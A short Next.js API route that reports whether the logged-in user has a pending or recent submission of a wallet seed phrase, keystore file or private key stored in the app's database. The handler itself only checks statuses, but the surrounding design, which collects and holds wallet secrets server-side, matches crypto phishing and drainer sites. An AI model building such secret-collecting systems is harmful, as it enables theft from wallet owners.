import { getServerSession } from "next-auth";
import { authOptions } from "@/auth";
import { connectToDB } from "@/lib/connectDB";
import SeedPhrase from "@/models/SeedPhrase";
import Keystore from "@/models/KeystoreJson";
import PrivateKey from "@/models/PrivateKey";

export async function GET(req) {
  await connectToDB();
  const session = await getServerSession(authOptions);
  const userId = session?.user?.id || null;
  const type = req.nextUrl.searchParams.get("type");

  // Check if any pending submission exists for this user
  const pendingSeed = await SeedPhrase.findOne({ userId, status: "pending" });
  const pendingKey = await Keystore.findOne({ userId, status: "pending" });
  const pendingPriv = await PrivateKey.findOne({ userId, status: "pending" });

  if (pendingSeed) {
    return Response.json({ status: "pending", pendingType: "phrase" });
  }
  if (pendingKey) {
    return Response.json({ status: "pending", pendingType: "keystore" });
  }
  if (pendingPriv) {
    return Response.json({ status: "pending", pendingType: "private" });
  }

  // If a type is specified, return its latest status
  let Model;
  if (type === "phrase") Model = SeedPhrase;
  else if (type === "keystore") Model = Keystore;
  else if (type === "private") Model = PrivateKey;
  else return Response.json({ status: "none" });

  const record = await Model.findOne({ userId }).sort({ createdAt: -1 });
  return Response.json({ status: record?.status || "none" });
}